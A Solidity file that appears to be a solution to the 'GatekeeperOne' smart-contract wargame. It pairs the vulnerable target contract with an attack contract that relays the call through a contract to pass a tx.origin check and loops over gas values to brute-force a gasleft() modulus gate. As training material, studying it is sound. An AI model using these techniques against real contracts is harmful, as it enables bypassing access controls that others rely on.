// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract GatekeeperOneHack {
    GatekeeperOne private immutable target;

    constructor(address _target) {
        target = GatekeeperOne(_target);
    }

    function hack(bytes8 _gatekey) external {
        for (uint256 i = 0; i < 8191; i++) {
            (bool result, ) = address(target).call{gas: (8191*3 + i)}(abi.encodeWithSignature("enter(bytes8)", _gatekey));
            if (result) {
                break;
            }
        }
    }
}

contract GatekeeperOne {
    address public entrant;

    modifier gateOne() {
        require(msg.sender != tx.origin);
        _;
    }

    modifier gateTwo() {
        require(gasleft() % 8191 == 0);
        _;
    }

    modifier gateThree(bytes8 _gateKey) {
        require(uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)), "GatekeeperOne: invalid gateThree part one");
        require(uint32(uint64(_gateKey)) != uint64(_gateKey), "GatekeeperOne: invalid gateThree part two");
        require(uint32(uint64(_gateKey)) == uint16(uint160(tx.origin)), "GatekeeperOne: invalid gateThree part three");
        _;
    }

    function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) {
        entrant = tx.origin;
        return true;
    }
}